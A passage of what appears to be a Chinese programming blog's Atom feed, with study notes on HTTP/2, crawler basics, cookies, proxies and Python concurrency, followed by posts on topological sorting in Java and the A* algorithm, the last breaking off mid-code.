在传输层做了很多优化，主要目标是通过支持完整的请求与响应复用来减少延迟，并通过有效压缩 HTTP 请求头字段的方式将协议开销降到最低，同时增加对请求优先级和服务器推送的支持。另外，修改版本为 2.0 是因为 2.0 版本实现了二进制分帧层，无法与 HTTP 1.x 的服务器和客户端兼容。</p><ul><li>二进制分帧层<br>在 1.x 版本中，请求和响应都是用文本格式传输的，头部和实体间是用文本换行符隔开的，HTTP 2.0 则将文本格式改为二进制格式，使得解析更高效。同时将请求和响应数据分割为更小的帧，并采用二进制编码，将 HTTP 协议通信分解为二进制编码帧的交换，这些帧对应着特定数据流中的消息，所有这些都可以在一个 TCP 连接中复用。</li><li>多路复用<br>在 HTTP 1.x 中，如果客户端要发起多个并行请求以提升性能，需要使用多个 TCP 连接，而且浏览器为了控制资源，对单个域名会有 6~8 个 TCP 连接请求的限制。但在 HTTP 2.0 中，客户端和服务器可将 HTTP 消息分解为互不依赖的帧，然后交错发送，再在另一端将其重新组装，达到以下效果：<ul><li>并行交错地发送多个请求，请求之间互不影响</li><li>并行交错地发送多个响应，响应之间互不干扰</li><li>使用一个连接并行发送多个请求和响应</li><li>不必再为绕过 HTTP 1.x 限制而做很多工作</li><li>消除不必要的延迟和提高现有网络容量的利用率，减少页面加载时间</li><li>同域名只需占用一个 TCP 连接，并行发送多个请求和响应，消除多余的延时和内存消耗</li><li>每个请求可以带一个 31 位的优先值，0 表示最高优先级，数值越大优先级越低。据此，客户端和服务器可以在处理不同的流时采取不同的策略，以最优的方式发送流、消息和帧   </li></ul></li><li>流控制<br>流控制是一种阻止发送方向接收方发送大量数据的机制，以免超出后者的需求或处理能力。HTTP 2.0 提供了一组简单的构建块，允许客户端和服务器实现它们自己的数据流和连接级流控制。<ul><li>流控制具有方向性。每个接收方都可根据自身需要选择为每个数据流和整个连接设置任意的窗口大小</li><li>流控制的窗口大小是动态调整的。每个接收方都可公布其初始连接和数据流控制窗口（字节单位），当发送放发出 DATA 帧时窗口减小，在接收方发出 WINDOW_UPDATE 帧时窗口增大</li><li>流控制无法停用。建立 HTTP 2.0 连接后，客户端与服务器交换 SETTINGS 帧，这会在两个方向上设置流控制窗口</li></ul></li><li>服务器推送<br>服务器可对一个客户端请求发送多个响应，除了对最初请求响应外，也可主动推送资源，无须客户端明确请求。</li><li>HTTP 2.0 发展现状<br>任重而道远，虽然一些主流网站和主流浏览器实现了对 HTTP 2.0 的支持，但总体上大部分网站仍以 HTTP 1.1 为主。另外，一些编程语言库还未完全支持 HTTP’ 2.0，对 Python 来说，hyper、httpx 等库已支持 2.0，但广泛使用的 request 库依然只支持 HTTP 1.1。</li></ul><h3 id="爬虫基本原理"><a href="#爬虫基本原理" class="headerlink" title="爬虫基本原理"></a>爬虫基本原理</h3><p>把互联网比作一张大网，爬虫（网络爬虫）便是在网上爬行的蜘蛛。把网中的节点比作一个个网页，蜘蛛爬到节点相当于爬虫访问了一个页面。节点间的连线可比作网页间的链接关系，蜘蛛通过一个节点后，顺着节点连线继续爬行到下一个节点，意味着爬虫通过网页间的链接关系继续获取后续网页，直至将整个网站涉及页面都访问到并存储获取到的数据。</p><p>爬虫就是获取网页并提取和保存信息的自动化程序。</p><h3 id="Session-和-Cookie"><a href="#Session-和-Cookie" class="headerlink" title="Session 和 Cookie"></a>Session 和 Cookie</h3><p>很多页面需要登录才可以访问，为了保持这种登录状态，就要用到 Session 和 Cookie。</p><p>HTTP 有一个特点，无状态。是指 HTTP 协议对事物处理是没有记忆能力的，服务器并不知道客户端处于什么状态，如果需要多次处理之前的消息，客户端就需要额外传递一些重复请求，才能获取后续响应。</p><p>Session，即会话，本义指有始有终的一系列动作、消息。如打电话时，从拿起电话拨号通话，到挂断电话之间的一系列过程可称为一个 Session。它位于服务端，用来保持用户的 Session 信息。当用户请求到来，如果还没对应 Session，则会新建。当 Session 过期或被放弃后，服务器会终止该 Session。</p><p>Cookie 在客户端，浏览器在下次访问相同网页时会自动带上，Cookie 中携带了 Session ID 信息，服务器通过识别 Cookie 鉴定出具体用户，然后判断是否处于登录状态，并返回对应响应。</p><p>Cookie 包含的内容如下：</p><table><thead><tr><th>条目</th><th align="center">描  述</th></tr></thead><tbody><tr><td>Name</td><td align="center">Cookie 名称，一经创建，不可更改</td></tr><tr><td>Value</td><td align="center">Cookie 值，若为 Unicode 字符，则需要为字符编码；若为二进制数据，则需要使用 BASE64 编码</td></tr><tr><td>Domain</td><td align="center">指定可以访问该 Cookie 的域名</td></tr><tr><td>Path</td><td align="center">Cookie 的使用路径。如 / 表示所有页面，/path/ 表示路径为 /path/ 的页面才能访问</td></tr><tr><td>Max-Age</td><td align="center">Cookie 的失效时间，单位秒，常和 Expires 一起使用，通过此属性可计算 Cookie 的有效时间。若为负数，Cookie 在浏览器关闭后失效</td></tr><tr><td>Size</td><td align="center">Cookie 的大小</td></tr><tr><td>HTTP</td><td align="center">Cookie 的 httponly 属性。若为 true，则只有在 HTTP Headers中才会带有此 Cookie 的信息，不能通过 document.cookie 访问此 Cookie</td></tr><tr><td>Secure</td><td align="center">是否仅允许使用安全协议传输 Cookie。使用安全协议在传输数据前会先加密，默认为 false</td></tr></tbody></table><p><strong>tips</strong></p><p>除非程序通知服务器删除一个 Session，否则服务器会一直保留。当浏览器关闭后 Cookie 就消失的情况，等再次打开连接服务器，新 Cookie 无法连接到原先的 Session。如果将 Cookie 保存到硬盘上，或使用某种手段改写浏览器发出的 HTTP 请求头，把原来的 Cookie 发给服务器，则又能保持登录状态。</p><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>网站会采取一些反爬虫措施，如检测某个 IP 在单位时间内的请求次数，如果请求次数超过设定阈值，会拒绝响应请求，并返回一些错误信息，这种情况称为封 IP。一种有效的伪装 IP 的方式就是使用代理。</p><ol><li><strong>基本原理</strong></li></ol><p>代理是发挥着网络信息中转站的作用，当客户端发起请求时，先由代理服务器接收，再由代理服务器发给 Web 服务器，返回的响应也是先由代理服务器接收，再发给客户端。如此，Web 服务器便无法识别真实 IP。</p><ol start="2"><li><strong>代理作用</strong></li></ol><ul><li>突破自身 IP 的访问限制，访问一些平时不能访问的站点</li><li>访问一些单位和团体的内部资源，如使用教育网内地址段的免费代理服务器，就可以下载和上传对教育网开放的各类 FTP，也可以查询、共享各类资料等</li><li>提高访问速度。通常，代理服务器会设置一个较大的硬盘缓冲区，当外界信息通过时，会保存到缓冲区中，当其他用户访问相同信息时，直接从缓冲区取出信息，提高访问速度</li><li>隐藏真实 IP。上网者可以隐藏自己的 IP，免受攻击或防止被封锁</li></ul><ol start="3"><li><strong>代理分类</strong></li></ol><p>根据<strong>协议</strong>区分：</p><ul><li>FTP 代理服务器：主要用于访问 FTP 服务器，一般有上传、下载以及缓存功能，端口一般为 21、2121等</li><li>HTTP 代理服务器：主要用于访问网页，一般有内容过滤和缓存功能，端口一般为 80、8080、3128等</li><li>SSL/TLS 代理：主要用于访问加密网站，一般有 SSL 或 TLS 加密功能（最高支持 128 位），端口一般为 443</li><li>RTSP 代理：主要用于 Realplayer 访问 Real 流媒体服务器，一般有缓存功能，端口一般为 554</li><li>Telnet 代理：主要用于 Telnet 远程控制（黑客入侵计算机时常用于隐藏身份），端口一般为 23</li><li>POP3/SMTP 代理：主要用于以 POP3/SMTP 方式收发邮件，一般有缓存功能，端口一般为 110/25</li><li>SOCKS 代理：单纯传递数据包，不关心具体协议和用法，所以速度快很多，一般有缓存功能，端口一般为 1080。SOCKS 代理协议又分为 SOCKS4 和 SOCKS5，SOCKS4 只支持 TCP，后者则支持 TCP 和 UDP，还支持各种身份验证机制、服务器端域名解析等</li></ul><p>根据<strong>匿名程序</strong>区分</p><ul><li>高度匿名代理：会将数据包原封不动地转发</li><li>普通匿名代理：会对数据包对一些改动，服务器可能会发现访问的是代理服务器，并有一定概率去追查真实 IP。这里代理服务器通常会加入的 HTTP 头有 HTTP_VIA 和 HTTP_X_FORWARDED_FOR</li><li>透明代理：不但改动了数据包，还告诉服务器客户端的真实 IP。这种代理主要利用缓存技术提高访问速度，用内容过滤提高安全性，如内网中的硬件防火墙</li><li>间谍代理：由阻止或个人创建的代理服务器，用于记录用户传输的数据，然后对记录的数据进行研究、监控等</li></ul><ol start="4"><li><strong>常见代理设置</strong></li></ol><h3 id="多线程和多进程"><a href="#多线程和多进程" class="headerlink" title="多线程和多进程"></a>多线程和多进程</h3><ol><li><strong>多线程含义</strong></li></ol><p>进程是线程的集合，进程是由一个或多个线程构成的，线程是操作系统进行运算调度的最小单位，是进程中的最小运行单元。如在一个浏览器中，播放音乐是一个线程，播放视频也是一个线程，这些线程并发或并行执行使得浏览器可以同时运行多个任务。</p><ol start="2"><li><strong>并发与执行</strong></li></ol><p>处理器同一时间只能执行一条指令。并发（concurrency）是指多个线程对应的多条指令被快速轮换执行，从宏观上看起来是同时运行的，但同一时刻只有一个线程被执行。</p><p>并行（parallel）是指同一时刻有多条指令在多个处理器上同时执行，意味着并行必须依赖多个处理器。</p><ol start="3"><li><strong>多线程适用场景</strong></li></ol><p>在一个程序的进程中，有些操作是比较耗时的，如等待数据库查询结果的返回、等待网页的响应。处理器在等待过程中，是可以使用多线程去执行其他操作的。</p><p>网络爬虫就是一个典型例子，爬虫向服务器发起请求后，有一段时间需要等待服务器响应，这属于 IO 密集型任务，对于这种任务，使用多线程就可以提高整体爬取效率。</p><ol start="4"><li><strong>多进程含义</strong></li></ol><p>进程（progress）是具有一定独立功能的程序在某个数据集合上的一次运行活动，是系统进行资源分配和调度的一个独立单位。多进程就是指同时运行多个进程。</p><ol start="5"><li><strong>Python 中的多线程和多进程</strong></li></ol><p>Python 中 GIL(Global Interpreter Lock，全局解释锁) 的限制导致不论是在单核还是多核条件下，同一时刻只能运行一个线程，使得 Python 多线程无法发挥多核并行优势。</p><p>GIL设计之初是出于对数据安全的考虑，Python 多线程下，每个线程执行方式如下：</p><ul><li>获取 GIL</li><li>执行对应线程代码</li><li>释放 GIL</li></ul><p>GIL 就好像一个通行证，一个 Python 进程中，只有一个 GIL，线程只有拿到通行证才能执行，也就是说多进程能更好发挥多核优势。</p><p>对于爬虫这种 IO 密集型任务来说，多线程和多进程产生影响差别不大，但对于计算密集型任务来说，由于 GIL 的存在，Python 多线程的整体运行效率在多核情况下可能反而比单核还低。而 Python 多进程相比多线程，运行效率在多核情况下比单核会有成倍提升。</p><p>整体来看，Python 多进程比多线程更有优势。另外，由于进程是系统进行资源分配和调度的一个独立单位，所以各进程间的数据是不共享的，进程之间的数据须有单独的机制来实现。</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://s2.loli.net/2022/02/15/MUcb8kYIRaP21gN.png&quot; style=&quot;zoom: 67%;&quot; /&gt;

&lt;p&gt;本章我们会详细了解 HTTP 原理、爬虫的基本原理、Cookie的基本原理、多进程和多线程的基本原理等，有助于我们更好理解和编写网络爬虫程序。&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://speedpromise.github.io/categories/Python/"/>
    
    
    <category term="爬虫笔记" scheme="https://speedpromise.github.io/tags/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>拓扑排序</title>
    <link href="https://speedpromise.github.io/archives/fb40efc5.html"/>
    <id>https://speedpromise.github.io/archives/fb40efc5.html</id>
    <published>2021-10-31T02:46:09.000Z</published>
    <updated>2022-02-16T14:26:10.861Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://i.loli.net/2021/10/31/IshnK7BdfaJVo4l.jpg" alt="img" style="zoom:50%;" /><p>编译器是如何通过源文件两两之间的局部依赖关系，确定一个全局的编译顺序呢？</p><span id="more"></span><p>我们可以把源文件与源文件之间的依赖关系，抽象成一个有向图，每个源文件对应一个顶点，依赖关系就是边。</p><p>而且，这个图不仅是有向图，还要是一个有向无环图，拓扑排序本身就是一个有向无环图的算法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Graph</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> v; <span class="comment">// 顶点的个数</span></span><br><span class="line">  <span class="keyword">private</span> LinkedList&lt;Integer&gt; adj[]; <span class="comment">// 邻接表</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Graph</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.v = v;</span><br><span class="line">    adj = <span class="keyword">new</span> LinkedList[v];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;v; ++i) &#123;</span><br><span class="line">      adj[i] = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addEdge</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t)</span> </span>&#123; <span class="comment">// s先于t，边s-&gt;t</span></span><br><span class="line">    adj[s].add(t);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是数据结构，实现拓扑排序的算法有两种，分别是 <strong>Kahn 算法</strong>和 <strong>DFS 深度优先搜索</strong></p><p><strong>1. Kahn 算法</strong></p><p>主要用了贪心思想</p><p>遍历到某个顶点时，入度 -1，入度为 0 时即输出到拓扑排序的结果序列中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">topoSortByKahn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span>[] inDegree = <span class="keyword">new</span> <span class="keyword">int</span>[v]; <span class="comment">// 统计每个顶点的入度</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v; ++i) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; adj[i].size(); ++j) &#123;</span><br><span class="line">      <span class="keyword">int</span> w = adj[i].get(j); <span class="comment">// i-&gt;w</span></span><br><span class="line">      inDegree[w]++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  LinkedList&lt;Integer&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (inDegree[i] == <span class="number">0</span>) queue.add(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">    <span class="keyword">int</span> i = queue.remove();</span><br><span class="line">    System.out.print(<span class="string">&quot;-&gt;&quot;</span> + i);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; adj[i].size(); ++j) &#123;</span><br><span class="line">      <span class="keyword">int</span> k = adj[i].get(j);</span><br><span class="line">      inDegree[k]--;</span><br><span class="line">      <span class="keyword">if</span> (inDegree[k] == <span class="number">0</span>) queue.add(k);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2. DFS 深度优先搜素</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">topoSortByDFS</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 先构建逆邻接表，边s-&gt;t表示，s依赖于t，t先于s</span></span><br><span class="line">  LinkedList&lt;Integer&gt; inverseAdj[] = <span class="keyword">new</span> LinkedList[v];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v; ++i) &#123; <span class="comment">// 申请空间</span></span><br><span class="line">    inverseAdj[i] = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v; ++i) &#123; <span class="comment">// 通过邻接表生成逆邻接表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; adj[i].size(); ++j) &#123;</span><br><span class="line">      <span class="keyword">int</span> w = adj[i].get(j); <span class="comment">// i-&gt;w</span></span><br><span class="line">      inverseAdj[w].add(i); <span class="comment">// w-&gt;i</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">boolean</span>[] visited = <span class="keyword">new</span> <span class="keyword">boolean</span>[v];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v; ++i) &#123; <span class="comment">// 深度优先遍历图</span></span><br><span class="line">    <span class="keyword">if</span> (visited[i] == <span class="keyword">false</span>) &#123;</span><br><span class="line">      visited[i] = <span class="keyword">true</span>;</span><br><span class="line">      dfs(i, inverseAdj, visited);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> vertex, LinkedList&lt;Integer&gt; inverseAdj[], <span class="keyword">boolean</span>[] visited)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; inverseAdj[vertex].size(); ++i) &#123;</span><br><span class="line">    <span class="keyword">int</span> w = inverseAdj[vertex].get(i);</span><br><span class="line">    <span class="keyword">if</span> (visited[w] == <span class="keyword">true</span>) <span class="keyword">continue</span>;</span><br><span class="line">    visited[w] = <span class="keyword">true</span>;</span><br><span class="line">    dfs(w, inverseAdj, visited);</span><br><span class="line">  &#125; <span class="comment">// 先把vertex这个顶点可达的所有顶点都打印出来之后，再打印它自己</span></span><br><span class="line">  System.out.print(<span class="string">&quot;-&gt;&quot;</span> + vertex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="拓扑排序应用"><a href="#拓扑排序应用" class="headerlink" title="拓扑排序应用"></a>拓扑排序应用</h3><p>凡是需要通过局部顺序来推导全局顺序的，一般都能用拓扑排序来解决。除此之外，拓扑排序还能检测图中环的存在。对于 Kahn 算法来说，如果最后输出出来的顶点个数，少于图中顶点个数，图中还有入度不是 0 的顶点，那就说明，图中存在环。</p><p>关于图中环的检测，在解决查找最终推荐人的问题时，就说到可能存在脏数据，导致循环推荐，如，A 推荐 B，B 推荐 C，C 推荐 A。我们可以把用户之间的推荐关系，从数据库中加载到内存中，然后构建成今天讲的这种有向图数据结构，再利用拓扑排序，就可以快速检测出是否存在环了</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://i.loli.net/2021/10/31/IshnK7BdfaJVo4l.jpg&quot; alt=&quot;img&quot; style=&quot;zoom:50%;&quot; /&gt;

&lt;p&gt;编译器是如何通过源文件两两之间的局部依赖关系，确定一个全局的编译顺序呢？&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>A* 算法</title>
    <link href="https://speedpromise.github.io/archives/8ec8a19a.html"/>
    <id>https://speedpromise.github.io/archives/8ec8a19a.html</id>
    <published>2021-10-28T12:49:15.000Z</published>
    <updated>2022-02-16T14:38:42.336Z</updated>
    
    <content type="html"><![CDATA[<p><img data-src="https://i.loli.net/2021/10/28/UvuOAae9QGZ2FmN.png"></p><p>A Star 算法是一种很常用的路径查找和图形遍历算法。利用当前与问题有关的信息作为启发式信息，有效提升查找效率，具有较好的性能和准确度。</p><span id="more"></span><p>A*算法通过下面这个函数来计算每个节点的优先级。</p><p>$f(n) = g(n) + h(n)$</p><ul><li>f(n) 是节点 n 的综合优先级，我们总会选取 f(n) 最小的值（优先级最高）的下一个节点，也因此 A* 算法会借助<strong>优先队列</strong>来实现；</li><li>g(n) 是节点 n 距离起点的代价；</li><li>h(n) 是节点 n 距离终点的估计代价，也是 A* 算法的启发函数</li></ul><p>A* 算法具有两个性质：</p><ul><li><p>如果对于任意的节点 $x$，$H(x) \leq H^*(x)$  恒成立，即我们「估计」出的从节点 $x$ 到终点 $t$ 的最短路径长度总是不超过「实际」的最短路径长度，那么称启发函数 $H(x)$ 是可接纳的（admissible heuristic）。在这种情况下，$A*$ 算法一定能找到最短路，但同一节点可能需要加入优先队列并搜索多次，即当我们从优先队列中取出节点 $x$ 时，$G(x)$ 并不一定等于从起点到节点 $x$ 的「实际」最短路径的长度；</p></li><li><p>如果对于任意的两个节点 $x$ 和 $y$，并且 $x$ 到 $y$ 有一条长度为 $D(x, y)$ 的有向边，$H(x)−H(y)≤D(x,y)$ 恒成立，并且 $H(t)=0$，那么称启发函数 $H(x)$ 是一致的（consistent heuristic）。可以证明，一致的启发函数一定也是可接纳的。在这种情况下，同一节点只会被加入优先队列一次，并搜索不超过一次，即当我们从优先队列中取出节点 $x$ 时，$G(x)$ 一定等于从起点到节点 $x$ 的「实际」最短路径的长度。</p></li></ul><p>算法描述如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">frontier &#x3D; PriorityQueue()</span><br><span class="line">frontier.put(start, 0)</span><br><span class="line">came_from &#x3D; dict()</span><br><span class="line">cost_so_far &#x3D; dict()</span><br><span class="line">came_from[start] &#x3D; None</span><br><span class="line">cost_so_far[start] &#x3D; 0</span><br><span class="line"></span><br><span class="line">while not frontier.empty():</span><br><span class="line">   current &#x3D; frontier.get()</span><br><span class="line"></span><br><span class="line">   if current &#x3D;&#x3D; goal:</span><br><span class="line">      break</span><br><span class="line">   </span><br><span class="line">   for next in graph.neighbors(current):</span><br><span class="line">      new_cost &#x3D; cost_so_far[current] + graph.cost(current, next)</span><br><span class="line">      if next not in cost_so_far or new_cost &lt; cost_so_far[next]:</span><br><span class="line">         cost_so_far[next] &#x3D; new_cost</span><br><span class="line">         priority &#x3D; new_cost + heuristic(goal, next)</span><br><span class="line">         frontier.put(next, priority)</span><br><span class="line">         came_from[next] &#x3D; current</span><br></pre></td></tr></table></figure><p>作为启发式函数的 h(n)，以八数码问题为例，可以使用曼哈顿距离作为启发搜索条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def heuristic(a, b):</span><br><span class="line">   # Manhattan distance on a square grid</span><br><span class="line">   return abs(a.x - b.x) + abs(a.y - b.y)</span><br></pre></td></tr></table></figure><hr><p>下面以 LeetCode 第 773 题为例</p><p>在一个 2 x 3 的板上（board）有 5 块砖瓦，用数字 1~5 来表示, 以及一块空缺用 0 来表示.<br>一次移动定义为选择 0 与一个相邻的数字（上下左右）进行交换.<br>最终当板 board 的结果是 [[1,2,3],[4,5,0]] 谜板被解开。<br>给出一个谜板的初始状态，返回最少可以通过多少次移动解开谜板，如果不能解开谜板，则返回 -1 </p><p>示例：</p><blockquote><p>输入：board = [[1,2,3],[4,0,5]]<br>输出：1<br>解释：交换 0 和 5 ，1 步完成</p><p>输入：board = [[1,2,3],[5,4,0]]<br>输出：-1<br>解释：没有办法完成谜板</p><p>输入：board = [[4,1,2],[5,0,3]]<br>输出：5<br>解释：<br>最少完成谜板的最少移动次数是 5 ，<br>一种移动路径:<br>尚未移动: [[4,1,2],[5,0,3]]<br>移动 1 次: [[4,1,2],[0,5,3]]<br>移动 2 次: [[0,1,2],[4,5,3]]<br>移动 3 次: [[1,0,2],[4,5,3]]<br>移动 4 次: [[1,2,0],[4,5,3]]<br>移动 5 次: [[1,2,3],[4,5,0]]<br>输入：board = [[3,2,4],[1,5,0]]<br>输出：14</p></blockquote><p>提示：</p><blockquote><p>board 是一个如上所述的 2 x 3 的数组.<br>board[i][j] 是一个 [0, 1, 2, 3, 4, 5] 的排列</p></blockquote><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>启发函数 $H(status)= \sum_{i=1}^5(status中数字 i 的位置与目标状态中数字 i 的位置之间的曼哈顿距离)$</p><p>我们同时可以预处理出任意两个位置的曼哈顿距离，具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AStar</span>:</span></span><br><span class="line">    DIST = [</span><br><span class="line">        [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算启发函数</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getH</span>(<span class="params">status: <span class="built_in">str</span></span>) -&gt; int:</span></span><br><span class="line">        ret = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">if</span> status[i] != <span class="string">&quot;0&quot;</span>:</span><br><span class="line">                ret += AStar.DIST[i][<span 